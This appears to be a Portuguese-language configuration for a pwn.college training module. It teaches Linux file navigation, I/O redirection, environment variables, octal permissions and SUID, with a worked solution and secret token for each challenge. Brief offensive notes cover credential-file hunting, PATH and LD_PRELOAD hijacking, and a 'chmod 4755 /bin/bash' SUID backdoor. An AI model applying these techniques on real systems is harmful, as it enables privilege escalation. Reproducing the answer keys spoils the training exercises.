  - name: 'Guia Teórico: Anatomia de Permissões Unix, Notação Octal e SUID'
    type: markdown
    content: |
      ### Estrutura de Permissões no Linux

      No ecossistema Unix/Linux, todo arquivo e diretório possui permissões divididas em três escopos de usuários:
      1. **Usuário proprietário (User - u)**
      2. **Grupo proprietário (Group - g)**
      3. **Outros usuários do sistema (Others - o)**

      Cada escopo é composto por três operações básicas representadas por valores binários e octais:
      * **Leitura (`r` - Read):** Valor octal **4** (binário `100`). Permite visualizar o conteúdo do arquivo ou listar entradas de um diretório.
      * **Escrita (`w` - Write):** Valor octal **2** (binário `010`). Permite modificar/excluir arquivos ou criar/deletar itens em um diretório.
      * **Execução (`x` - Execute):** Valor octal **1** (binário `001`). Permite rodar o arquivo como programa ou navegar (`cd`) em um diretório.

      #### O Caso Crítico: `chmod 640` vs `chmod 755`
      * **`chmod 640 arquivo.txt`**:
        - **User (6 = 4+2):** Leitura (`r`) e Escrita (`w`).
        - **Group (4 = 4):** Apenas Leitura (`r`).
        - **Others (0 = 0):** **Nenhum acesso** (`---`). Outros usuários no sistema não podem ler nem modificar o arquivo.
        *Atenção:* Confundir `640` com acesso irrestrito é uma falha grave de segurança operacional.
      * **`chmod 755 script.sh`**:
        - **User (7 = 4+2+1):** Leitura, Escrita e Execução (`rwx`).
        - **Group (5 = 4+1):** Leitura e Execução (`r-x`).
        - **Others (5 = 4+1):** Leitura e Execução (`r-x`).

      #### Bits Especiais de Execução: SUID e SGID
      * **SUID (Set User ID - octal 4000, representado por `s` no lugar do `x` do dono):** Quando um binário possui o bit SUID ativado (ex: `-rwsr-xr-x`), ele executa temporariamente com os privilégios do usuário proprietário do arquivo (frequentemente o `root`), independente de qual usuário o disparou. No pwn.college, os desafios de exploração utilizam binários SUID para ler a `/flag`.
      * **SGID (Set Group ID - octal 2000):** Executa com os privilégios do grupo proprietário.
  challenges:
  - id: linux-nav-files
    name: Expedição no Sistema de Arquivos
    description: |
      ### 📖 Introdução Teórica

      No ecossistema Unix e Linux, o sistema de arquivos não utiliza letras de unidades físicas (como as partições `C:` ou `D:` do Windows). Em vez disso, adota uma hierarquia lógica unificada em formato de árvore estritamente invertida, padronizada pelo **Filesystem Hierarchy Standard (FHS)**. Todo e qualquer recurso — sejam discos físicos, memórias virtuais, periféricos ou soquetes de comunicação — é mapeado a partir de um único nó-raiz denominado `/` (*root*).

      ```
      / (Raiz do Sistema)
      ├── bin -> usr/bin          [Binários essenciais do sistema: ls, cat, cp, bash]
      ├── etc/                    [Arquivos de configuração global: /etc/passwd, /etc/shadow]
      ├── home/                   [Diretórios pessoais dos usuários comuns]
      ├── root/                   [Diretório pessoal exclusivo do superusuário root]
      ├── proc/                   [Pseudofilesystem do Kernel: estado dos processos em tempo real]
      ├── tmp/                    [Arquivos temporários e voláteis de escrita irrestrita]
      └── challenge/              [Diretório operacional do pwn.college com os desafios]
      ```

      #### A Convenção de Arquivos Ocultos
      A existência de "arquivos ocultos" no Linux não é um atributo de criptografia ou segurança profunda, mas sim uma convenção visual histórica do UNIX. Quando a função `readdir()` do kernel lê o diretório, utilitários padrão de listagem (como o comando `ls`) filtram e omitem propositalmente qualquer arquivo ou pasta cujo primeiro caractere seja um ponto (`.`, ASCII `0x2E`).

      | Tipo de Arquivo | Exemplo Real | Visível com `ls`? | Visível com `ls -a`? | Impacto em Segurança |
      | :--- | :--- | :---: | :---: | :--- |
      | **Arquivo Comum** | `relatorio.txt` | **Sim** | Sim | Arquivos convencionais de trabalho |
      | **Histórico de Shell** | `.bash_history` | **Não** | **Sim** | Comandos anteriores (frequentemente com senhas expostas) |
      | **Chave de Acesso** | `.ssh/id_rsa` | **Não** | **Sim** | Chaves privadas SSH para movimentação lateral |
      | **Variáveis de Ambiente** | `.env` / `.secret` | **Não** | **Sim** | Tokens de APIs, credenciais de banco de dados |

      #### Relevância Ofensiva e Defensiva
      * **Segurança Ofensiva (Red Team / Pentest):** Durante a fase de pós-exploração, invasores enumeram diretórios em busca de arquivos ocultos que desenvolvedores e administradores esquecem (ex: `.git/config`, histórico de comandos `.bash_history`, credenciais de nuvem em `.aws/credentials`). Da mesma forma, atacantes instalam persistências e mineradores como arquivos ocultos em diretórios com permissão de escrita (ex: `/tmp/.xmr_miner`).
      * **Segurança Defensiva (Blue Team / DFIR):** Analistas forenses e operadores de resposta a incidentes realizam varreduras com flags de listagem profunda para identificar artefatos maliciosos camuflados e auditar permissões de arquivos de configuração confidenciais.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A navegação eficiente e a auditoria de arquivos dependem do domínio dos comandos fundamentais do shell POSIX:

      #### Comandos Essenciais e Flags
      * `pwd` (*Print Working Directory*): Imprime o caminho absoluto do diretório atual.
      * `cd <caminho>` (*Change Directory*): Altera o diretório de trabalho. Use `cd ..` para subir um nível e `cd ~` para ir à home do usuário.
      * `ls`: Lista o conteúdo do diretório atual.
        * `-l`: Formato longo detalhado (permissões, proprietário, grupo, tamanho em bytes e data).
        * `-a` (*all*): Lista **todas** as entradas, incluindo arquivos ocultos (iniciados com `.`).
        * `-h` (*human-readable*): Exibe tamanhos em KB, MB ou GB em vez de bytes puros.
      * `cat <arquivo>`: Concatena e exibe o conteúdo do arquivo na saída padrão.
      * `find <origem> -name ".*"`: Localiza recursivamente arquivos ocultos a partir da pasta indicada.

      #### Snippets de Terminal e Saídas Esperadas

      1. **Listagem Padrão (Sem flag `-a`):**
         ```bash
         $ ls
         linux-nav-files  DESCRIPTION.md
         ```
         *Nota-se que apenas os arquivos visíveis são retornados.*

      2. **Listagem Completa com Formato Longo (`ls -la`):**
         ```bash
         $ ls -la
         total 32
         drwxr-xr-x 2 hacker hacker 4096 Oct 26 12:00 .
         drwxr-xr-x 8 root   root   4096 Oct 26 12:00 ..
         -rw-r--r-- 1 hacker hacker   26 Oct 26 12:00 .segredo_cyberguard
         -rw-r--r-- 1 hacker hacker 2890 Oct 26 12:00 DESCRIPTION.md
         -rwsr-xr-x 1 root   root   8640 Oct 26 12:00 linux-nav-files
         ```
         *O arquivo oculto `.segredo_cyberguard` foi revelado.*

      3. **Exibição do Conteúdo da Chave:**
         ```bash
         $ cat .segredo_cyberguard
         cyberguard_linux_fhs_2026
         ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Siga rigorosamente as etapas abaixo dentro do terminal do container para capturar a flag:

      1. **Navegue até o diretório do desafio:**
         ```bash
         cd /challenge
         pwd
         ```
         *Confirme que você está em `/challenge`.*

      2. **Inspecione os arquivos ocultos do diretório:**
         Execute a listagem exaustiva com o utilitário `ls`:
         ```bash
         ls -la /challenge
         ```
         *Observe a presença do arquivo `.segredo_cyberguard`.*

      3. **Extraia o valor da chave secreta:**
         Leia o conteúdo do arquivo oculto com `cat`:
         ```bash
         cat /challenge/.segredo_cyberguard
         ```
         *O terminal exibirá a chave:* `cyberguard_linux_fhs_2026`.

      4. **Invoque o binário passando a chave como argumento:**
         Execute o binário `/challenge/linux-nav-files` fornecendo a chave extraída:
         ```bash
         /challenge/linux-nav-files cyberguard_linux_fhs_2026
         ```
         *Ou execute em um comando único elegante via command substitution:*
         ```bash
         /challenge/linux-nav-files $(cat /challenge/.segredo_cyberguard)
         ```

      5. **Capture e submeta a flag:**
         O binário validará a chave secreta e exibirá a flag do desafio:
         ```text
         [+] Chave validada com sucesso! Voce dominou navegacao e arquivos ocultos.
         pwn.college{...}
         ```
         Copie a string completa no formato `pwn.college{...}` e submeta-a no painel da plataforma para pontuar.
  - id: linux-io-redirection
    name: Mestria em Redirecionamento (I/O e Pipes)
    description: |
      ### 📖 Introdução Teórica

      Na filosofia do sistema operacional Unix/Linux, vigora a premissa fundamental de que "tudo é um arquivo" (*everything is a file*). Isso significa que fluxos de dados, terminais, soquetes de rede e arquivos em disco são tratados de maneira homogênea através de canais denominados **Descritores de Arquivos (File Descriptors - FDs)**.

      Quando um processo é criado no Linux, ele herda automaticamente do kernel três canais padrão de entrada e saída:

      | Descritor (FD) | Nome Canônico | Propósito Funcional | Dispositivo Padrão |
      | :---: | :---: | :--- | :--- |
      | **0** | `stdin` | Entrada padrão de dados do processo | Teclado do usuário |
      | **1** | `stdout` | Saída padrão de dados normais | Monitor / Terminal |
      | **2** | `stderr` | Saída padrão de mensagens de erro | Monitor / Terminal |

      ```
                             +-------------------------+
             stdin (FD 0)    |                         |    stdout (FD 1)
         ------------------> |   Processo em Execução  | ------------------->
         (Entrada de Dados)  |                         | (Saída Regular)
                             +-------------------------+
                                          |
                                          | stderr (FD 2)
                                          v
                                 (Mensagens de Erro)
      ```

      #### A Mecânica dos Pipes (`|`)
      O operador de pipe (`|`) conecta a saída de um programa à entrada de outro sem necessidade de persistência intermediária em disco. Quando executamos `cmd1 | cmd2`, o kernel do Linux cria um buffer circular em memória (*FIFO ring buffer*, tipicamente de 64 KB). O `stdout` (FD 1) do `cmd1` é conectado diretamente à ponta de escrita do pipe, enquanto o `stdin` (FD 0) do `cmd2` é conectado à ponta de leitura. Os dois processos rodam concorrentemente.

      #### Relevância Ofensiva e Defensiva
      * **Segurança Ofensiva (Red Team / Exploit Dev):** A transmissão de dados brutos e exploits automatizados depende integralmente do `stdin`. Em cenários de buffer overflow ou injeção de comandos, o invasor canaliza bytes arbitrários ou shellcodes via pipe diretamente para o processo-alvo (`python3 -c "print('A'*80)" | ./vulneravel`), contornando limitações de digitação manual.
      * **Segurança Defensiva (Blue Team / SIEM):** Analistas de segurança utilizam pipelines complexos para filtrar terabytes de logs do sistema em segundos, agregando tentativas de autenticação maliciosa, isolando IPs agressores e sintetizando relatórios em tempo real sem sobrecarregar o subsistema de armazenamento.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      O controle de descritores no shell Bash é exercido através de operadores especializados:

      #### Tabela de Operadores de Redirecionamento
      | Operador | Sintaxe | Efeito Prático |
      | :---: | :--- | :--- |
      | `\|` | `cmd1 \| cmd2` | Conecta o `stdout` de `cmd1` ao `stdin` de `cmd2` via buffer em memória. |
      | `>` | `cmd > arquivo` | Redireciona o `stdout` para um arquivo, **sobrescrevendo** seu conteúdo anterior. |
      | `>>` | `cmd >> arquivo` | Redireciona o `stdout` para um arquivo, **anexando** dados ao final (*append*). |
      | `<` | `cmd < arquivo` | Alimenta o `stdin` do comando diretamente a partir do arquivo. |
      | `2>` | `cmd 2> erro.log` | Redireciona exclusivamente as mensagens de erro (`stderr` / FD 2). |
      | `2>&1` | `cmd > all.log 2>&1` | Faz o `stderr` seguir para o mesmo destino para o qual o `stdout` foi apontado. |

      #### Snippets Práticos e Saídas do Terminal

      1. **Descarte de Mensagens de Erro em Varreduras do Sistema:**
         ```bash
         $ find / -perm -4000 2>/dev/null
         ```
         *O `2>/dev/null` descarta silenciosamente centenas de mensagens de "Permissão Negada" (Permission Denied), exibindo apenas resultados autorizados.*

      2. **Pipeline de Extração de Falhas de Autenticação:**
         ```bash
         $ cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c
         ```
         *Gera a contagem consolidada de tentativas falhas agrupadas por endereço IP.*

      3. **Injeção de Entrada Controlada via Echo e Printf:**
         ```bash
         $ echo "DADO_TESTE" | wc -c
         11
         $ printf "DADO_TESTE" | wc -c
         10
         ```
         *Observe que o `echo` insere uma quebra de linha (`\n`), totalizando 11 bytes, enquanto o `printf` envia apenas os 10 bytes brutos.*

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Para concluir o desafio e capturar a flag no container pwn.college:

      1. **Compreenda o requisito do binário:**
         O binário `/challenge/linux-io-redirection` espera receber a string de validação exata `CYBERGUARD_PIPELINE` através de seu canal de entrada padrão (`stdin`). Se você executá-lo sem argumentos em um terminal interativo (`tty`), ele avisará que a entrada padrão não foi fornecida via pipeline.

      2. **Resolva via Pipeline com `echo` (Método Principal):**
         Envie o token diretamente ao processo através de um pipe:
         ```bash
         echo "CYBERGUARD_PIPELINE" | /challenge/linux-io-redirection
         ```

      3. **Resolva via Pipeline com `printf` (Método de Precisão de Bytes):**
         ```bash
         printf "CYBERGUARD_PIPELINE\n" | /challenge/linux-io-redirection
         ```

      4. **Resolva via Redirecionamento de Arquivo (`<`):**
         Como alternativa instrutiva, grave o token em `/tmp` e alimente o programa:
         ```bash
         echo "CYBERGUARD_PIPELINE" > /tmp/input_token.txt
         /challenge/linux-io-redirection < /tmp/input_token.txt
         ```

      5. **Capture e submeta a flag:**
         Ao receber a entrada correta pelo descritor 0 (`stdin`), o validador emitirá a confirmação e imprimirá a flag:
         ```text
         [+] Redirecionamento I/O recebido com sucesso!
         pwn.college{...}
         ```
         Copie a string no formato `pwn.college{...}` e registre sua pontuação na plataforma.
  - id: linux-env-manipulation
    name: Engenharia de Variáveis de Ambiente
    description: "### \U0001F4D6 Introdução Teórica\n\nNo sistema operacional Linux, cada processo possui um bloco de memória\
      \ reservado para armazenar seu contexto operacional na forma de pares chave-valor denominado **Bloco de Variáveis de\
      \ Ambiente** (`char **environ`). Quando um processo pai (como a sua shell Bash) cria um processo filho através das chamadas\
      \ de sistema `fork()` e `execve()`, o ambiente é herdado pelo processo recém-criado.\n\n```\nProcesso Pai: Bash (PID\
      \ 1024)\n├── Variáveis Locais de Shell (não exportadas, restritas à shell)\n└── Bloco de Ambiente Global (environ):\n\
      \    ├── PATH=/usr/local/bin:/usr/bin:/bin\n    ├── USER=hacker\n    ├── HOME=/home/hacker\n    └── CYBERGUARD_TOKEN=treinamento_2026\
      \  ──[ Herança via execve() ]──> Processo Filho (PID 1025)\n```\n\n#### Variáveis Locais vs. `export` vs. Injeção Inline\n\
      Uma das falhas mais frequentes em administração e segurança de sistemas é presumir que qualquer variável declarada no\
      \ terminal será visível aos programas executados a seguir:\n\n| Método | Sintaxe no Terminal | Visível na Shell Atual?\
      \ | Herdada por Processos Filhos? |\n| :--- | :--- | :---: | :---: |\n| **Atribuição Local** | `VAR=\"teste\"` | **Sim**\
      \ | **Não** (invisível para binários externos) |\n| **Exportação Global** | `export VAR=\"teste\"` | **Sim** | **Sim**\
      \ (herdada por todos os filhos futuros) |\n| **Injeção Efêmera** | `VAR=\"teste\" ./binario` | **Não** (apenas no binário)\
      \ | **Sim** (isolada estritamente no subprocesso) |\n\n#### Relevância Ofensiva e Defensiva\n* **Segurança Ofensiva\
      \ (Red Team / PrivEsc):** \n  - **PATH Hijacking:** Se o `PATH` contiver diretórios graváveis pelo usuário antes dos\
      \ diretórios do sistema (ex: `PATH=.:$PATH`), binários privilegiados podem ser induzidos a executar binários maliciosos\
      \ locais em vez dos comandos do sistema.\n  - **Injeção via Variáveis Dinâmicas:** Variáveis como `LD_PRELOAD` ou `LD_LIBRARY_PATH`\
      \ forçam o carregador dinâmico a carregar bibliotecas arbitrárias antes de qualquer outra. Em regras `sudo` mal configuradas\
      \ que preservam o ambiente (`env_keep`), isso concede escalação imediata para root.\n* **Segurança Defensiva (Blue Team\
      \ / Cloud Security):** Em contêineres Docker e orquestrações Kubernetes, segredos de bancos de dados, chaves de API\
      \ e tokens JWT são costumeiramente injetados via variáveis de ambiente. Qualquer vulnerabilidade de LFI (Local File\
      \ Inclusion) ou RCE que permita inspecionar o arquivo `/proc/self/environ` pode expor integralmente as credenciais corporativas.\n\
      \n---\n\n### \U0001F4BB Exemplos Práticos e Sintaxe\n\nO gerenciamento de variáveis de ambiente no Linux envolve os\
      \ seguintes comandos e técnicas:\n\n#### Comandos e Sintaxe Operacional\n* `printenv` ou `env`: Lista todas as variáveis\
      \ de ambiente exportadas na sessão atual.\n* `printenv <VAR>`: Exibe o valor de uma variável específica.\n* `export\
      \ <VAR>=\"<valor>\"`: Promove a variável para a tabela global de ambiente, garantindo que processos filhos a herdem.\n\
      * `unset <VAR>`: Remove a variável do ambiente da sessão.\n* `<VAR>=\"<valor>\" <comando>`: Executa o comando injetando\
      \ a variável exclusivamente naquele ciclo de vida, sem poluir a shell atual.\n\n#### Snippets de Terminal e Saídas Observadas\n\
      \n1. **Demonstração de Falha com Variável Apenas Local:**\n   ```bash\n   $ MINHA_VAR=\"cyberguard\"\n   $ python3 -c\
      \ \"import os; print(os.environ.get('MINHA_VAR'))\"\n   None\n   ```\n   *Como a variável não foi exportada, o subprocesso\
      \ Python não a encontrou.*\n\n2. **Demonstração com `export` (Herança Confirmada):**\n   ```bash\n   $ export MINHA_VAR=\"\
      cyberguard\"\n   $ python3 -c \"import os; print(os.environ.get('MINHA_VAR'))\"\n   cyberguard\n   ```\n\n3. **Injeção\
      \ Inline sem Poluição de Escopo:**\n   ```bash\n   $ TOKEN=\"efemero\" python3 -c \"import os; print(os.environ.get('TOKEN'))\"\
      \n   efemero\n   $ echo $TOKEN\n   (vazio)\n   ```\n\n4. **Inspeção Forense via Pseudo-Filesystem `/proc`:**\n   ```bash\n\
      \   $ cat /proc/$$/environ | tr '\\0' '\\n' | grep PATH\n   PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\n\
      \   ```\n   *O pseudofilesystem armazena variáveis terminadas pelo byte nulo (`\\0`); o comando `tr` as substitui por\
      \ quebras de linha.*\n\n---\n\n### \U0001F3AF O que fazer para resolver o desafio (Passo a Passo)\n\nSiga estas instruções\
      \ para suprir a variável esperada e resgatar a flag:\n\n1. **Inspecione a exigência do binário:**\n   Execute `/challenge/linux-env-manipulation`\
      \ sem alterar o ambiente:\n   ```bash\n   /challenge/linux-env-manipulation\n   ```\n   *O programa indicará que a variável\
      \ `CYBERGUARD_TOKEN` está ausente ou com valor incorreto.*\n\n2. **Método 1: Resolução Elegante com Injeção Inline (Recomendado):**\n\
      \   Defina a variável imediatamente antes do comando em uma única linha:\n   ```bash\n   CYBERGUARD_TOKEN=\"treinamento_2026\"\
      \ /challenge/linux-env-manipulation\n   ```\n\n3. **Método 2: Resolução com `export` na Sessão:**\n   Exporte a variável\
      \ para a shell e execute o binário:\n   ```bash\n   export CYBERGUARD_TOKEN=\"treinamento_2026\"\n   /challenge/linux-env-manipulation\n\
      \   ```\n   *(Opcional) Verifique se a variável está ativa antes da execução:*\n   ```bash\n   printenv CYBERGUARD_TOKEN\n\
      \   ```\n\n4. **Capture e submeta a flag:**\n   O binário validará a variável no dicionário de ambiente e liberará a\
      \ flag:\n   ```text\n   [+] Variavel de ambiente CYBERGUARD_TOKEN identificada!\n   pwn.college{...}\n   ```\n   Copie\
      \ a sequência no padrão `pwn.college{...}` e insira no portal de treinamento.\n"
  - id: linux-permissions-octal
    name: Auditoria e Cálculo de Permissões Octais
    description: |
      ### 📖 Introdução Teórica

      O Linux adota o modelo de **Controle de Acesso Discricionário (DAC - Discretionary Access Control)** padronizado pelo POSIX. Nele, cada arquivo ou diretório possui permissões organizadas estritamente em torno de três classes de entidades:

      1. **User (`u`):** O usuário proprietário do arquivo.
      2. **Group (`g`):** O grupo de usuários ao qual o arquivo pertence.
      3. **Others (`o`):** Todos os demais usuários existentes no sistema operacional.

      Para cada uma das três classes, o sistema avalia três bits de operação fundamentais, aos quais são atribuídos pesos binários e valores octais (base 8):

      * **`r` (Read / Leitura):** Peso binário `100` = **4** em octal. Permite ler o conteúdo do arquivo ou listar o diretório.
      * **`w` (Write / Escrita):** Peso binário `010` = **2** em octal. Permite modificar ou truncar o arquivo ou criar/apagar arquivos no diretório.
      * **`x` (Execute / Execução):** Peso binário `001` = **1** em octal. Permite carregar o arquivo na memória como processo ou navegar (`cd`) no diretório.

      ```
                          DÍGITO 1: USER (Dono)        = 6 (4 + 2 + 0) -> rw-
      chmod 640  --->     DÍGITO 2: GROUP (Grupo)       = 4 (4 + 0 + 0) -> r--
                          DÍGITO 3: OTHER (Outros)      = 0 (0 + 0 + 0) -> ---
      ```

      #### O Ponto Crítico: `chmod 640` vs. `chmod 755`
      * **`chmod 640 arquivo` (`-rw-r-----`):** O dono pode ler e escrever (`6 = 4+2`); membros do grupo podem apenas ler (`4 = 4`); outros usuários do sistema possuem **zero permissões** (`0 = 0`). Este é o padrão ouro da indústria para proteger credenciais de banco de dados e arquivos de configuração sensíveis. Confundir `0` com acesso livre é uma das falhas mais graves em auditorias.
      * **`chmod 755 arquivo` (`-rwxr-xr-x`):** O dono possui controle total de execução e escrita (`7 = 4+2+1`); o grupo e os demais usuários podem ler e executar (`5 = 4+1`), mas não modificar. Utilizado para binários públicos e scripts operacionais.

      #### Relevância Ofensiva e Defensiva
      * **Segurança Ofensiva (Red Team):** Invasores que obtêm acesso inicial com contas desprivilegiadas (como `www-data`) vasculham ativamente o sistema em busca de arquivos de configuração com permissões negligentes (como `chmod 644` ou `chmod 777`). Se um arquivo contendo senhas puder ser lido pela classe `others`, a credencial de root ou de banco é comprometida de imediato.
      * **Segurança Defensiva (Blue Team / Hardening):** Guias de conformidade como CIS Benchmarks (*Center for Internet Security*) e normas ISO 27001 exigem a imposição estrita de permissões mínimas (`640` ou `600`) em arquivos confidenciais (`/etc/shadow`, `/var/log/*`, `.env`), impedindo a leitura indevida por outros processos locais.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A gestão e verificação de permissões exigem o domínio dos utilitários `chmod`, `stat` e `ls`:

      #### Tabela de Equivalência Octal e Simbólica
      | Notação Octal | Notação Simbólica | Dono (`u`) | Grupo (`g`) | Outros (`o`) | Aplicação Típica |
      | :---: | :---: | :---: | :---: | :---: | :--- |
      | **`777`** | `rwxrwxrwx` | Leitura/Escrita/Exec | Leitura/Escrita/Exec | Leitura/Escrita/Exec | **Crítico:** Nunca usar em ambientes reais |
      | **`755`** | `rwxr-xr-x` | Leitura/Escrita/Exec | Leitura/Exec | Leitura/Exec | Binários e scripts públicos em `/usr/bin` |
      | **`644`** | `rw-r--r--` | Leitura/Escrita | Leitura | Leitura | Arquivos públicos de texto (HTML, README) |
      | **`640`** | `rw-r-----` | **Leitura/Escrita** | **Leitura** | **Nenhum** | **Arquivos confidenciais de serviços/DB** |
      | **`600`** | `rw-------` | Leitura/Escrita | Nenhum | Nenhum | Chaves privadas SSH (`id_rsa`) e certificados |

      #### Comandos e Flags
      * `chmod <modo-octal> <arquivo>`: Aplica a máscara numérica especificada.
      * `chmod <u/g/o/a><+/-/=><r/w/x> <arquivo>`: Notação simbólica (ex: `chmod u=rw,g=r,o= arquivo`).
      * `stat -c "%a %A %n" <arquivo>`: Exibe a representação octal pura (`%a`), simbólica (`%A`) e o nome do arquivo (`%n`).
      * `umask`: Exibe a máscara de criação de arquivos do usuário atual.

      #### Snippets de Terminal e Saídas Observadas

      1. **Aplicação de Permissão 640:**
         ```bash
         $ chmod 640 /tmp/teste.conf
         ```

      2. **Inspeção com `ls -l`:**
         ```bash
         $ ls -l /tmp/teste.conf
         -rw-r----- 1 hacker hacker 0 Oct 26 12:00 /tmp/teste.conf
         ```
         *Note: posições 2-4 são `rw-`, posições 5-7 são `r--` e posições 8-10 são `---`.*

      3. **Inspeção com `stat` (Validação Octal Exata):**
         ```bash
         $ stat -c "%a %A" /tmp/teste.conf
         640 -rw-r-----
         ```

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Para satisfazer os critérios do verificador `/challenge/linux-permissions-octal`:

      1. **Compreenda o objetivo:**
         O binário do desafio exige que o arquivo `/tmp/config.conf` exista e esteja protegido com a máscara octal exata `640`.

      2. **Crie o arquivo alvo em `/tmp`:**
         Utilize o comando `touch` para instanciar o arquivo:
         ```bash
         touch /tmp/config.conf
         ```

      3. **Configure as permissões octais para 640:**
         Aplique o comando `chmod`:
         ```bash
         chmod 640 /tmp/config.conf
         ```

      4. **Confirme as permissões aplicadas:**
         Certifique-se de que o arquivo reflete `-rw-r-----`:
         ```bash
         stat -c "%a %A %n" /tmp/config.conf
         # Deve retornar: 640 -rw-r----- /tmp/config.conf
         ```

      5. **Execute o binário de validação:**
         Dispare o auditor para avaliar o arquivo e emitir a flag:
         ```bash
         /challenge/linux-permissions-octal
         ```

      6. **Capture e submeta a flag:**
         Ao detectar a permissão `640`, o programa imprimirá a confirmação de conformidade e a flag:
         ```text
         [+] Permissao 640 confirmada: Dono rw, Grupo r, Outros nada!
         pwn.college{...}
         ```
         Copie a sequência `pwn.college{...}` e submeta-a no painel do dojo.
  - id: linux-suid-privilege
    name: O Poder do SUID (Set User ID)
    description: |
      ### 📖 Introdução Teórica

      Em sistemas operacionais Unix/Linux convencionais, um processo em execução herda o identificador do usuário que o disparou, denominado **Real User ID (RUID)**. Se o usuário `hacker` (UID 1000) executa um programa, o processo roda com UID 1000 e fica terminantemente proibido pelo kernel de ler ou modificar recursos reservados ao superusuário `root` (UID 0), como `/etc/shadow` ou `/flag`.

      No entanto, diversas tarefas legítimas do sistema operacional exigem privilégios elevados temporários (por exemplo, quando um usuário comum altera sua própria senha com `/usr/bin/passwd`). Para viabilizar esse comportamento sem conceder acesso irrestrito de root, o modelo POSIX introduziu o bit especial **SUID (Set User ID)**.

      ```
      [ Usuário Comum: hacker (UID 1000) ]
                    │
                    │ Dispara: /usr/bin/passwd (Dono: root | Bit SUID ativo: -rwsr-xr-x)
                    ▼
          ┌────────────────────────────────────────────────────────┐
          │ Processo em Execução pelo Kernel:                      │
          │   • Real UID (RUID)      = 1000 (hacker)               │
          │   • Effective UID (EUID) = 0    (root) <--- PRIVILÉGIO! │
          └────────────────────────────────────────────────────────┘
                    │
                    │ O Kernel autoriza a escrita pelo EUID 0:
                    ▼
          [ Arquivo /etc/shadow ]
      ```

      #### Anatomia dos Bits Especiais de Execução
      Além dos bits normais de leitura, escrita e execução (`rwx`), o Linux reserva três bits especiais adicionais, representados pelo quarto dígito (mais significativo) na notação octal de 4 dígitos:

      | Bit Especial | Peso Octal | Representação Simbólica | Efeito Prático no Sistema | Impacto de Segurança |
      | :---: | :---: | :---: | :--- | :--- |
      | **SUID** | `4000` | `-rw**s**r-xr-x` | O processo executa com o UID do **proprietário do arquivo** | Escalação de Privilégios (LPE) |
      | **SGID** | `2000` | `-rwxr-**s**r-x` | O processo executa com o GID do **grupo do arquivo** | Herança forçada de grupo |
      | **Sticky Bit**| `1000` | `drwxrwxrw**t**` | Apenas o criador de um arquivo pode apagá-lo na pasta | Proteção de pastas compartilhadas (`/tmp`) |

      #### Relevância Ofensiva e Defensiva
      * **Segurança Ofensiva (Red Team / GTFOBins):** Quando um binário possui o bit SUID e pertence ao `root`, qualquer vulnerabilidade em seu código (como buffer overflow, injeção de comandos ou uso inadequado de argumentos de shell) permite a execução de comandos com privilégios de superusuário. Na plataforma **pwn.college**, todos os binários de desafio utilizam o bit SUID para conseguir abrir e ler o arquivo `/flag` restrito ao root.
      * **Segurança Defensiva (Blue Team / Hardening):** Administradores de segurança utilizam o utilitário `find` e regras de auditoria do `auditd` para monitorar qualquer criação de novos binários SUID no sistema, já que a introdução de uma shell com SUID (`chmod 4755 /bin/bash`) é a técnica de backdoor local mais clássica existente.

      ---

      ### 💻 Exemplos Práticos e Sintaxe

      A auditoria e identificação de binários SUID são realizadas através de comandos de busca de permissões:

      #### Comandos e Sintaxe de Varredura
      * `find / -perm -4000 -type f 2>/dev/null`: Varre todo o sistema de arquivos buscando executáveis que contenham o bit SUID (máscara octal 4000). O `2>/dev/null` descarta erros de acesso.
      * `find / -perm -u=s -type f 2>/dev/null`: Sintaxe simbólica equivalente buscando o bit `s` no escopo do usuário.
      * `ls -la <binario>`: Exibe os atributos do arquivo. Se o bit SUID estiver ativo, a letra `s` aparecerá no lugar do tradicional `x` do proprietário (`-rwsr-xr-x`). Se aparecer `S` maiúsculo, o SUID está ativo mas o bit de execução normal não foi concedido.
      * `id`: Exibe o RUID (`uid`), o RGID (`gid`), e os IDs efetivos (`euid`/`egid`) caso difiram.

      #### Snippets de Terminal e Saídas Observadas

      1. **Varredura de Binários SUID Nativos no Linux:**
         ```bash
         $ find / -perm -4000 -type f 2>/dev/null
         /usr/bin/passwd
         /usr/bin/sudo
         /usr/bin/chsh
         /usr/bin/newgrp
         /challenge/linux-suid-privilege
         ```

      2. **Inspeção Detalhada das Permissões do Binário SUID:**
         ```bash
         $ ls -la /challenge/linux-suid-privilege
         -rwsr-xr-x 1 root root 16384 Oct 26 12:00 /challenge/linux-suid-privilege
         ```
         *Note o `-rwsr-xr-x`: o proprietário é `root` e o bit `s` confirma a execução com privilégios elevados.*

      ---

      ### 🎯 O que fazer para resolver o desafio (Passo a Passo)

      Para concluir a missão e extrair a flag no container pwn.college:

      1. **Inspecione os atributos do executável:**
         Verifique as permissões de `/challenge/linux-suid-privilege`:
         ```bash
         ls -la /challenge/linux-suid-privilege
         ```
         *Observe o bit `s` e o usuário proprietário `root`.*

      2. **Execute uma varredura para auditar outros binários SUID do sistema:**
         Pratique a localização de binários privilegiados:
         ```bash
         find /challenge -perm -4000 -type f 2>/dev/null
         ```

      3. **Invoque o binário do desafio:**
         Execute o programa no terminal:
         ```bash
         /challenge/linux-suid-privilege
         ```

      4. **Analise o diagnóstico de identidade emitido pelo processo:**
         O binário exibirá as identidades consultadas diretamente via chamadas de sistema `getuid()` e `geteuid()`:
         ```text
         [*] Seu Real UID: 1000 | Effective UID: 0
         [+] Executando com privilegios de root via SUID!
         pwn.college{...}
         ```
         *Constata-se que o Real UID pertence ao usuário `hacker` (1000), mas o Effective UID foi elevado pelo kernel para `root` (0), viabilizando a leitura de `/flag`.*

      5. **Capture e submeta a flag:**
         Copie a sequência no padrão `pwn.college{...}` e submeta-a na plataforma.
- id: redes-protocolos
  name: 'Módulo 2: Redes de Computadores, Protocolos & Reconhecimento'
  description: |
    Nenhum ataque ou defesa cibernética ocorre no vácuo. Este módulo consolida a arquitetura da pilha TCP/IP, as portas de serviços canônicos e a anatomia detalhada do handshake de três vias (Three-Way Handshake: SYN -> SYN-ACK -> ACK).

